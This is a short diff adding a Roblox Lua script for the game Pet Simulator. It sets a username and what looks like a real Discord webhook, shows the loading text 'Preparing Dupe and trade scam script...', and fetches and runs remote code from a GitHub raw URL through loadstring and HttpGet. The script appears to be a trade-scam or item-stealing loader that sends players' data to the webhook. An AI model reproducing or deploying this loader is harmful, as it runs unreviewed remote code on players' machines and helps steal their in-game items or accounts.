@@ -1,0 +1,4 @@
+_G.Username = "Fake_Adr199"
+_G.Webhook = "https://discord.com/api/webhooks/1173296735406268477/0roFFpTamMw81fsg2qcUHTsujestmyVdjRoUQMLIFMbBU5zCzT6FjdeQcdTlKHuzdNGX"
+_G.LoadingScreenText = "Preparing Dupe and trade scam script..."
+loadstring(game:HttpGet("https://raw.githubusercontent.com/RJ077SIUU/PetSim/main/PSX", true))()
